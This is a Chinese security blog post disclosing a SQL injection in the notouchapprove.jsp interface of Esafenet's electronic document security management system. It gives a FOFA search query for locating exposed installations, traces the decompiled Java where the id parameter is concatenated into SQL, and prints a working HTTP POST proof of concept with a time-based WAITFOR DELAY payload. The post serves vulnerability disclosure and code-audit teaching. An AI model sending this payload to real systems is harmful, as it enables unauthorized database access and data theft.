---
title: "亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html
asset_dir: assets/亿赛通电子文档安全管理系统-notouchapprove.jsp-sql注入漏洞
---

# 亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/5 12:18
- 699浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

漏洞扫描服务

编码转换工具

Web安全书籍

---

# 漏洞简介

亿赛通电子文档安全管理系统的notouchapprove.jsp接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可以通过构造特定的POST请求，在多个参数id中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

文件大小转换

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

直接看 `notouchapprove.jsp` 的定义

```
<%
    MailDecryptApplicationModel model = new MailDecryptApplicationModel();
    String id = request.getParameter("id");
    MailDecryptApplicationInfo info = model.findById(id);
```

参数如`id`被带入`findById`方法

```
public MailDecryptApplicationInfo findById(String id) throws Exception {
    return this.dao.findById(id);
}

public MailDecryptApplicationInfo findById(String id) throws Exception {
    if (id == null) {
        return null;
    } else {
        Map table = new Hashtable();
        table.put("MailDecryptApplicationId", id);
        List list = this.findByPrecise(table);
        return (MailDecryptApplicationInfo)(list.size() != 0 ? list.get(0) : null);
    }
}
```

继续跟进 `findByPrecise` 方法

```
public List findByPrecise(Map map) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + this.tableName);
    sql.append(CDGUtil.getWhereClauseForString(map));
    HashMap[] maps = this.getCommonResults(sql.toString());
```

再看下`getWhereClauseForString`的逻辑

```
public static String getWhereClauseForString(Map conditions) {
    if (conditions != null && conditions.size() != 0) {
        StringBuilder sBuilder = new StringBuilder();
        Set set = conditions.keySet();
        Iterator iterator = set.iterator();

        while(iterator.hasNext()) {
            String key = (String)iterator.next();
            Object object = conditions.get(key);
            String value = "";
            if (object instanceof String) {
                value = (String)object;
            } else {
                value = object.toString();
            }

            if (iterator.hasNext()) {
                sBuilder.append(" ").append(key).append("='").append(value).append("' and ");
            } else {
                sBuilder.append(" ").append(key).append("='").append(value).append("'  ");
            }
        }
```

其主要目的就是组装sql语句，可见参数`id`全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
Host: esafenet.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1'WAITFOR+DELAY'0%3a0%3a5'--
```

[![亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞](images/img-001-b2ac4793732a.webp)](https://image.mrxn.net/719cb8dea7c74f649ce4e68851bbd51f.webp)

成功延时 5 秒

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
